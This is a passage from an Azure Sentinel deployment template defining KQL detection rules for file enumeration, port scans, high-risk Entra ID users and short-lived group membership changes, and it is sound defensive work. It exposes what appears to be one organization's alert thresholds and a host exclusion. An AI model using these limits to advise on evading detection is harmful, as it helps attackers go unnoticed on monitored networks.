        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Detect potential file enumeration activity (ASIM Web Session)",
          "description": "This detection method identifies potential cases of file enumeration activity. The query is designed to identify client sources that generate multiple requests resulting in 404 error codes",
          "severity": "Medium",
          "enabled": false,
          "query": "// HTTP response status codes indicate whether a specific HTTP request has been successfully completed.\n// Please refer this for more details: https://developer.mozilla.org/en-US/docs/Web/HTTP/Status\nlet HTTPErrorCode=dynamic([\"404\"]);\nlet threshold = 10; // You can update this threshold to the value that suites your environment\n// let FileNotFoundRequests = \n_Im_WebSession (starttime=ago(1h))\n| where EventResultDetails in~ (HTTPErrorCode)\n// Filter the logs to include only HTTP GET requests with an HTTP status code of 404 and '/' in the URL\n| where HttpRequestMethod =~ \"GET\" and Url contains \"/\"\n| summarize\n    RequestCount = count(),\n    FileCount=dcount(Url),\n    EventStartTime=min(TimeGenerated),\n    EventEndTime=max(TimeGenerated),\n    RequestURLs = make_set(Url, 100),\n    DestinationIPList=make_set(DstIpAddr, 100)\n    by SrcIpAddr, SrcUsername, SrcHostname, DstHostname\n| where RequestCount > threshold  // Adjust the threshold as per your requirements\n| where DstHostname !contains \"counties.dcss.ca.gov\" // removing a bunch of noise from alerts - DanneF\n| extend\n    Name = iif(SrcUsername contains \"@\", tostring(split(SrcUsername, '@', 0)[0]), SrcUsername),\n    UPNSuffix = iif(SrcUsername contains \"@\", tostring(split(SrcUsername, '@', 1)[0]), \"\")\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Discovery",
            "CommandAndControl",
            "CredentialAccess"
          ],
          "techniques": [
            "T1083",
            "T1071",
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "b3731ce1-1f04-47c4-95c2-9827408c4375",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "User '{{SrcUsername}}' with IP '{{SrcIpAddr}}' has been observed with performing file enumeration activity",
            "alertDescriptionFormat": "User generated multiple requests '{{RequestCount}}' that has resulted in error code '404', suggesting the possibility of file enumeration activity. It's important to investigate the source and patterns of these extensive 404 errors to identify potential security threats. Details about this error code could be found [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status)"
          },
          "customDetails": {
            "EventStartTime": "EventStartTime",
            "DestinationIPList": "DestinationIPList",
            "FileCount": "FileCount",
            "RequestCount": "RequestCount",
            "EventEndTime": "EventEndTime",
            "RequestURLs": "RequestURLs"
          },
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SrcIpAddr"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "DstHostname"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "SrcHostname"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/3bee4db3-c1d0-4630-9cf1-fe0bead0ca75')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/3bee4db3-c1d0-4630-9cf1-fe0bead0ca75')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Port scan detected  (ASIM Network Session schema)",
          "description": "This rule identifies a possible port scan, in which a single source tries to access a large number of different ports is a short time frame. This may indicate that a [port scanner](https://en.wikipedia.org/wiki/Port_scanner) is trying to identify open ports in order to penetrate a system.\nThis analytic rule uses [ASIM](https://aka.ms/AboutASIM) and supports any built-in or custom source that supports the ASIM NetworkSession schema",
          "severity": "Medium",
          "enabled": false,
          "query": "let PortScanThreshold = 50;\n_Im_NetworkSession\n| where ipv4_is_private(SrcIpAddr) == False\n| where SrcIpAddr !in (\"127.0.0.1\", \"::1\")\n| summarize AttemptedPortsCount=dcount(DstPortNumber), AttemptedPorts=make_set(DstPortNumber, 100), ReportedBy=make_set(strcat(EventVendor, \"/\", EventProduct), 20) by SrcIpAddr, bin(TimeGenerated, 5m)\n| where AttemptedPortsCount > PortScanThreshold\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Discovery"
          ],
          "techniques": [
            "T1046"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "1da9853f-3dea-4ea9-b7e5-26730da3d537",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "AnyAlert",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "Potential port scan from {{SrcIpAddr}}",
            "alertDescriptionFormat": "A port scan has been performed from address {{SrcIpAddr}} over {{AttemptedPortsCount}} ports within 5 minutes. This may indicate that a [port scanner](https://en.wikipedia.org/wiki/Port_scanner) is trying to identify open ports in order to penetrate a system."
          },
          "customDetails": {
            "AttemptedPortsCount": "AttemptedPortsCount"
          },
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SrcIpAddr"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.6"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11365')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11365')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11365: [RBA] Azure AD - High Risk User Alert",
          "description": "This rule creates an alert when Azure AD identifies a high risk user MITRE: T1078 Category: Entra ID tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let alert_id = 'BV-11365';\nlet alert_type = 'RBA';\nlet exclude_hash = true;\nlet calculate_hash = true;\nlet max_description_line = 300;\nlet max_description_list_length = 5;      \nlet start_time = 15m;\nlet latency = 0m;\nlet start_time_suppress = 47h;\nlet alert_bin = 30m;\nlet global_config = dynamic({\n    'RBASCORE':2\n    , 'EXCLUSION': dynamic([{}])\n    , 'excluded_dedup_hash_fields': dynamic(['bv_alert_id', 'bv_e_c', 'bv_http_user_agent', 'bv_src_', 'bv_vendor_', 'bv_result_code_description'])     \n});\nlet end_time = now();\nlet excluded_dedup_fields = array_concat(bv_excluded_dedup_hash_fields, global_config['excluded_dedup_hash_fields']);\nlet exclusions = array_concat(global_config['EXCLUSION'], BV11365_CONFIG['EXCLUSIONS'], dynamic([{}]));\nlet excluded_description_fields = dynamic(['bv_raw', 'bv_e_c', 'bv_vendor_reason', 'bv_vendor_description']);\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV11365_CONFIG['RBASCORE']),real(2.0));       \nlet gen_detail_and_hash = (t: (*), ef:dynamic=dynamic([]), mfl:int=300, mal:int=5, efd:dynamic=dynamic([]), dh:boolean=true){\n        t\n        | extend a = pack_all()\n        | extend k = array_sort_asc(bag_keys(a))\n        | mv-apply k to typeof(string) on (\n            extend v = todynamic(tostring(a[k]))\n            | extend v = iff(gettype(v) != 'array', pack_array(v), v)\n            | extend \n                vl = iff(array_length(v) == 1 and isempty(v[0]),0,array_length(v))\n                , vf = k startswith 'bv_' and not (k has_any (efd))\n            | extend vv = vl == 1 \n            | extend \n                df = iff(vf and vv, k, '')\n                , dv = iff(vf and vv, v[0], '')\n            | extend e = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (ef)), strcat(\n                case(vl > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(v,0,(mal-1)),'\\n* '),0,mfl), '\\n')\n                , vl == 1, strcat(k,': ', v[0])\n                , '')\n                ),'')\n                | summarize \n                    e = make_set(e)\n                    , bv_dedup_fields = make_set_if(df, isnotempty(df))\n                    , bv_dedup_values = make_set_if(dv, isnotempty(dv))\n        )\n        | extend \n            ExtendedDescription=strcat_array(e, '\\n ')\n            , bv_dedup_hash = columnifexists('bv_dedup_hash', '')\n        | extend bv_dedup_hash = iff(dh,hash_sha1(strcat_array(bv_dedup_values,'')),bv_dedup_hash)\n  };\n        let match = (table_parameter: (*), items:dynamic, match_type: string){\n          table_parameter\n          | extend all_data = pack_all()\n          | mv-apply e = items on (\n              extend keys = bag_keys(e)\n              | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n              | mv-apply k = keys to typeof(string) on (\n                  extend list = split(e[k],',')\n                  | mv-apply l = list to typeof(string) on (\n                      extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                      | mv-apply i = item to typeof(string) on (\n                          extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                          | summarize excluded_count = countif(compare)\n                          | extend item_excluded = excluded_count > 0\n                      )\n                      | summarize excluded_count = countif(item_excluded)\n                      | extend item_excluded = excluded_count > 0\n                  )\n                  | summarize excluded_list_item = countif(item_excluded > 0)\n              )\n              | extend matched =  key_count == excluded_list_item and key_count != 0\n              | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n              | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n              | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n          )\n          | extend match_status = iff(matched contains \"true\", match_type, '')\n  };\n  let desc_gen = (T: (*), ttype:string){\n    T\n    | extend a = pack_all()\n    | extend t = tostring(a[ttype])\n    | extend t = replace('\\n', '@new_line@',t)\n    | extend ot = extract_all(@'(\\[.*?\\])',t)\n    | mv-apply o = ot on (\n        parse o with * '~' k'~' *\n        | extend v = todynamic(a[k])\n        | extend v = iff(gettype(v) !='array', pack_array(v), v)\n        | extend r = iff(isempty(v) or (array_length(v) == 1 and (isempty(v[0]) or v[0] == 0) or array_length(v)==0),'',o)\n        | extend r = trim_end(@'\\]',r)\n        | extend r = trim_start(@'\\[.*~',r)\n        | summarize otr =make_list(r)\n    )\n    | extend tr = replace_strings(t, ot, otr )\n    | extend sdk = extract_all(@'(<bv_[\\w_]*>)',tr)\n    | extend gk = extract_all(@'(<g_bv_[\\w_]*>)',tr)\n    | mv-apply g = gk on (\n        parse g with '<g_' key '_p' *\n        | parse g with * '_p_' verb '>'\n        | extend v = a[key]\n        | extend ip = (gettype(v) == 'array' and array_length(v) > 1) or toint(v)>1\n        | extend r = case (\n            isempty(verb) and not(ip), ''\n            , isempty(verb) and ip, 's'\n            , verb == 'was' and (not(ip) or isempty(ip)), 'was'\n            , verb == 'was' and ip, 'were'\n            , verb == 'this' and ip, 'these'\n            , verb == 'this' and not(ip), 'this'\n            , verb == 'is' and (not(ip) or isempty(ip)), 'is'\n            , verb == 'is' and ip, 'are'\n        ,''\n        )\n        | summarize gr = make_list(r)\n    )\n    | mv-apply k = sdk on (\n        parse k with '<' key '>'\n        | extend v = todynamic(tostring(a[key]))\n        | extend v = iff(gettype(v) != 'array', pack_array(v), v)\n        | extend vl = array_length(v)\n        | extend r = case(\n            vl == 1, v[0]\n            , vl == 2, strcat(v[0], ' and ', v[1])\n            ,vl  > 2, strcat(v[0], ', ', v[1], ', and ', vl-2, ' others')\n            ,'')\n    | summarize r = make_list(r))\n    | extend dr = replace_strings(tr, sdk, r)\n    | extend dr = replace_strings(dr, gk, gr)\n    | extend dr = replace('@new_line@', '\\n',dr)\n    | extend hd = coalesce(a['desc_gen'],dynamic({}))\n    | extend desc_gen = bag_set_key(hd, ttype, dr)\n  };\n  let rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n    let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId \n    | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n        let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId \n    | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n        table_parameter\n        | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n        | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n        | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n        | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n        | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n        | extend ModifiedRBAScore = case(\n          ModifiedRBAScore > 10, 10.0\n          , ModifiedRBAScore <0.1, 0.1\n          , ModifiedRBAScore\n        )\n        | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n  };            \nlet SignIn_Details = materialize(SigninLogs\n| where TimeGenerated between (ago(start_time_suppress + latency) .. end_time)\n| summarize arg_max(TimeGenerated, *) by CorrelationId\n| project TimeGenerated, IPAddress, ResultType, ResultDescription, LocationDetails, AutonomousSystemNumber, DeviceDetail, UserAgent, AppDisplayName, UserPrincipalName\n| lookup bv_asn_lookup on $left.AutonomousSystemNumber == $right.bv_src_asn\n| summarize bv_result_code_description = make_set_if(strcat(\"Code \", ResultType, \"_\", ResultDescription), ResultType <> 0), bv_src_asn = make_set(AutonomousSystemNumber, 5), bv_src_org = make_set(bv_src_org, 5)\n          , bv_src_app = make_set(AppDisplayName, 5) by bv_src_ip = IPAddress, bv_user = tolower(UserPrincipalName)\n);        \nAADUserRiskEvents\n| where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where RiskLevel =~ 'high'\n| mv-apply ParsedFields = parse_json(AdditionalInfo) on (\n    extend bv_http_user_agent = iff(ParsedFields.Key has 'userAgent', tostring(ParsedFields.Value), '')\n    , bv_vendor_risk_detail = iff(ParsedFields.Key has 'riskReasons', todynamic(ParsedFields.Value), dynamic(null))\n    , bv_alert_url = iff(ParsedFields.Key has 'alertUrl', todynamic(ParsedFields.Value), dynamic(null))\n    , bv_mitre_technique_id = iff(ParsedFields.Key has 'mitreTechniques', tostring(ParsedFields.Value), '')\n    | summarize bv_http_user_agent = make_set_if(bv_http_user_agent, isnotempty(bv_http_user_agent))\n    , bv_vendor_risk_detail = make_set_if(bv_vendor_risk_detail, array_length(bv_vendor_risk_detail) > 0)\n    , bv_alert_url = make_set_if(bv_alert_url, array_length(bv_alert_url) > 0)\n    , bv_mitre_technique_id = make_set_if(bv_mitre_technique_id, isnotempty(bv_mitre_technique_id))\n)\n| extend bv_src_country = tostring(Location.countryOrRegion)\n    , bv_src_city = tostring(Location.city)\n    , bv_src_region = tostring(Location.state)\n    , bv_user = tolower(UserPrincipalName)\n    , bv_user_id = UserId\n    , bv_vendor_risk_event_type = RiskEventType\n    , bv_severity = RiskLevel\n    , bv_vendor_reason = RiskState\n    , bv_alert_id = CorrelationId\n    , bv_vendor_description = AdditionalInfo\n    , bv_src_ip = IpAddress\n| summarize bv_start_time = arg_max(TimeGenerated, *), bv_e_c = count() by bv_user\n| join kind=leftouter SignIn_Details on bv_src_ip, bv_user\n| project-away bv_src_ip1, bv_user1\n| invoke match(exclusions, 'exclusion')\n| extend excluded = iff((alert_type in ('SOC','CUSTOM') and match_status == 'exclusion') or (alert_type == 'RBA' and visibility contains '0'), true, false)\n| where excluded == false\n| extend alert_id_temp = alert_id\n| lookup bv_desc_temp on alert_id_temp\n| invoke desc_gen('long_template')\n| invoke desc_gen('short_template')\n| invoke gen_detail_and_hash(excluded_description_fields, 300, 5,efd=excluded_dedup_fields,dh=calculate_hash)\n| where iff(exclude_hash, (BV_FUN_DEDUP(alert_id, start_time_suppress) !has bv_dedup_hash), true)\n| extend \n    bv_alarm_rba_score = BV_FUN_CALC_RBA(alert_id, visibility, rba_score)   \n    , bv_desc_l = strcat(desc_gen['long_template'],'\\n\\n',ExtendedDescription)\n    , bv_desc_s =desc_gen['short_template']\n| extend bv_alarm_victim_entities = pack_array(bv_cim_normalize_username(bv_user))\n| extend bv_alarm_attacker_entities = pack_array(bv_src_ip)\n| extend bv_rule_version = '1.0.5314'\n| extend bv_rule_timestamp = '1717101070.291726'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.5314 bv_rule_timestamp: 1717101070.291726'\n| project-keep\n    bv_*",
          "queryFrequency": "PT15M",
          "queryPeriod": "PT47H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Persistence",
            "PrivilegeEscalation",
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-11365: [RBA] Azure AD - {{bv_desc_s}}",
            "alertDescriptionFormat": "{{bv_desc_l}}\n\nMITRE: T1078\nCategory: Azure AD\ntag: RBA\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "VictimEntity": "bv_alarm_victim_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_user"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11015')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11015')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11015: [RBA] Windows - Transient Group Usage",
          "description": "This alert identifies users added and then removed from a group within the specified threshold MITRE: T1098 Category: Windows Security Events tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let alert_id = 'BV-11015';\nlet alert_type = 'RBA';\nlet exclude_hash = true;\nlet calculate_hash = true;\nlet max_description_line = 300;\nlet max_description_list_length = 5;      \nlet start_time = 1h;\nlet latency = 0m;\nlet start_time_historical = 2d;\nlet end_time = now();\nlet start_time_suppress = 1d;      \nlet global_config = dynamic({\n    'excluded_dedup_hash_fields': dynamic(['bv_vendor_', 'bv_alarm_value', 'bv_object'])\n});  \nlet EventIDList = dynamic([4728, 4732, 4756, 4729, 4733, 4757, 4624]);\nlet exclusions = array_concat(global_config['EXCLUSION'], BV11015_CONFIG['EXCLUSION'], dynamic([{}]));\nlet field_filter = array_concat(bv_global_field_filter, dynamic(['bv_src_ip', 'bv_start_time','bv_end_time']));\nlet excluded_description_fields = dynamic(['bv_raw', 'bv_dedup_fields', 'bv_alarm_value']);\nlet excluded_dedup_fields = array_concat(bv_excluded_dedup_hash_fields, global_config['excluded_dedup_hash_fields']);\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV11015_CONFIG['RBASCORE']),real(1.0));    \nlet gen_detail_and_hash = (t: (*), ef:dynamic=dynamic([]), mfl:int=300, mal:int=5, efd:dynamic=dynamic([]), dh:boolean=true){\n        t\n        | extend a = pack_all()\n        | extend k = array_sort_asc(bag_keys(a))\n        | mv-apply k to typeof(string) on (\n            extend v = todynamic(tostring(a[k]))\n            | extend v = iff(gettype(v) != 'array', pack_array(v), v)\n            | extend \n                vl = iff(array_length(v) == 1 and isempty(v[0]),0,array_length(v))\n                , vf = k startswith 'bv_' and not (k has_any (efd))\n            | extend vv = vl == 1 \n            | extend \n                df = iff(vf and vv, k, '')\n                , dv = iff(vf and vv, v[0], '')\n            | extend e = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (ef)), strcat(\n                case(vl > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(v,0,(mal-1)),'\\n* '),0,mfl), '\\n')\n                , vl == 1, strcat(k,': ', v[0])\n                , '')\n                ),'')\n                | summarize \n                    e = make_set(e)\n                    , bv_dedup_fields = make_set_if(df, isnotempty(df))\n                    , bv_dedup_values = make_set_if(dv, isnotempty(dv))\n        )\n        | extend \n            ExtendedDescription=strcat_array(e, '\\n ')\n            , bv_dedup_hash = columnifexists('bv_dedup_hash', '')\n        | extend bv_dedup_hash = iff(dh,hash_sha1(strcat_array(bv_dedup_values,'')),bv_dedup_hash)\n  };\n        let match = (table_parameter: (*), items:dynamic, match_type: string){\n          table_parameter\n          | extend all_data = pack_all()\n          | mv-apply e = items on (\n              extend keys = bag_keys(e)\n              | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n              | mv-apply k = keys to typeof(string) on (\n                  extend list = split(e[k],',')\n                  | mv-apply l = list to typeof(string) on (\n                      extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                      | mv-apply i = item to typeof(string) on (\n                          extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                          | summarize excluded_count = countif(compare)\n                          | extend item_excluded = excluded_count > 0\n                      )\n                      | summarize excluded_count = countif(item_excluded)\n                      | extend item_excluded = excluded_count > 0\n                  )\n                  | summarize excluded_list_item = countif(item_excluded > 0)\n              )\n              | extend matched =  key_count == excluded_list_item and key_count != 0\n              | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n              | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n              | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n          )\n          | extend match_status = iff(matched contains \"true\", match_type, '')\n  };\n  let desc_gen = (T: (*), ttype:string){\n    T\n    | extend a = pack_all()\n    | extend t = tostring(a[ttype])\n    | extend t = replace('\\n', '@new_line@',t)\n    | extend ot = extract_all(@'(\\[.*?\\])',t)\n    | mv-apply o = ot on (\n        parse o with * '~' k'~' *\n        | extend v = todynamic(a[k])\n        | extend v = iff(gettype(v) !='array', pack_array(v), v)\n        | extend r = iff(isempty(v) or (array_length(v) == 1 and (isempty(v[0]) or v[0] == 0) or array_length(v)==0),'',o)\n        | extend r = trim_end(@'\\]',r)\n        | extend r = trim_start(@'\\[.*~',r)\n        | summarize otr =make_list(r)\n    )\n    | extend tr = replace_strings(t, ot, otr )\n    | extend sdk = extract_all(@'(<bv_[\\w_]*>)',tr)\n    | extend gk = extract_all(@'(<g_bv_[\\w_]*>)',tr)\n    | mv-apply g = gk on (\n        parse g with '<g_' key '_p' *\n        | parse g with * '_p_' verb '>'\n        | extend v = a[key]\n        | extend ip = (gettype(v) == 'array' and array_length(v) > 1) or toint(v)>1\n        | extend r = case (\n            isempty(verb) and not(ip), ''\n            , isempty(verb) and ip, 's'\n            , verb == 'was' and (not(ip) or isempty(ip)), 'was'\n            , verb == 'was' and ip, 'were'\n            , verb == 'this' and ip, 'these'\n            , verb == 'this' and not(ip), 'this'\n            , verb == 'is' and (not(ip) or isempty(ip)), 'is'\n            , verb == 'is' and ip, 'are'\n        ,''\n        )\n        | summarize gr = make_list(r)\n    )\n    | mv-apply k = sdk on (\n        parse k with '<' key '>'\n        | extend v = todynamic(tostring(a[key]))\n        | extend v = iff(gettype(v) != 'array', pack_array(v), v)\n        | extend vl = array_length(v)\n        | extend r = case(\n            vl == 1, v[0]\n            , vl == 2, strcat(v[0], ' and ', v[1])\n            ,vl  > 2, strcat(v[0], ', ', v[1], ', and ', vl-2, ' others')\n            ,'')\n    | summarize r = make_list(r))\n    | extend dr = replace_strings(tr, sdk, r)\n    | extend dr = replace_strings(dr, gk, gr)\n    | extend dr = replace('@new_line@', '\\n',dr)\n    | extend hd = coalesce(a['desc_gen'],dynamic({}))\n    | extend desc_gen = bag_set_key(hd, ttype, dr)\n  };\n  let rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n    let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId \n    | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n        let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId \n    | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n        table_parameter\n        | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n        | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n        | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n        | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n        | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n        | extend ModifiedRBAScore = case(\n          ModifiedRBAScore > 10, 10.0\n          , ModifiedRBAScore <0.1, 0.1\n          , ModifiedRBAScore\n        )\n        | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n  };                   \nlet WinEvents = materialize(SecurityEvent\n| where TimeGenerated > ago(start_time_historical)\n| where EventID in (EventIDList)\n| parse MemberName with 'CN=' bv_object ',' *\n| project  \n    bv_user = SubjectUserName\n    , bv_user_id = SubjectUserSid\n    , bv_object_attr = TargetUserName\n    , bv_object_attr_id = TargetUserSid\n    , bv_object = iff(EventID == 4624, TargetUserName, bv_object)\n    , bv_object_id = iff(EventID == 4624, TargetUserSid, MemberSid)\n    , bv_object_category = 'user'\n    , bv_object_attr_category = 'group'\n    , bv_vendor_object = MemberName\n    , bv_change_action = 'modify'\n    , bv_start_time = TimeGenerated\n    , bv_src_dvc = Computer\n    , bv_event_id = EventID\n);\nWinEvents\n| where bv_event_id <> 4624\n| join kind=leftouter (WinEvents | where bv_event_id == 4624) on bv_object_id\n| summarize \n        bv_start_time = minif(bv_start_time, bv_event_id in (\"4728\", \"4732\", \"4756\"))\n        , bv_end_time = maxif(bv_start_time, bv_event_id in (\"4729\", \"4733\", \"4757\"))\n        , bv_user = make_set(bv_user)\n        , bv_user_id = make_set(bv_user_id)\n    by \n        bv_object\n        , bv_object_id\n        , bv_object_attr\n        , bv_vendor_object\n| where isnotempty(bv_end_time)\n| extend bv_alarm_value = bv_end_time - bv_start_time \n| where bv_alarm_value between (timespan(0) .. totimespan(BV11015_CONFIG['TIME_THRESHOLD']))\n| where bv_end_time > ago(start_time)\n| extend bv_alarm_value = strcat(format_timespan(bv_alarm_value, 'hh'), 'h ', format_timespan(bv_alarm_value, 'mm'), 'm ')\n| invoke match(exclusions, 'exclusion')\n| extend excluded = iff((alert_type in ('SOC','CUSTOM') and match_status == 'exclusion') or (alert_type == 'RBA' and visibility contains '0'), true, false)\n| where excluded == false\n| extend alert_id_temp = alert_id\n| lookup bv_desc_temp on alert_id_temp\n| invoke desc_gen('long_template')\n| invoke desc_gen('short_template')\n| invoke gen_detail_and_hash(excluded_description_fields, 300, 5,efd=excluded_dedup_fields,dh=calculate_hash)\n| where iff(exclude_hash, (BV_FUN_DEDUP(alert_id, start_time_suppress) !has bv_dedup_hash), true)\n| extend \n    bv_alarm_rba_score = BV_FUN_CALC_RBA(alert_id, visibility, rba_score)   \n    , bv_desc_l = 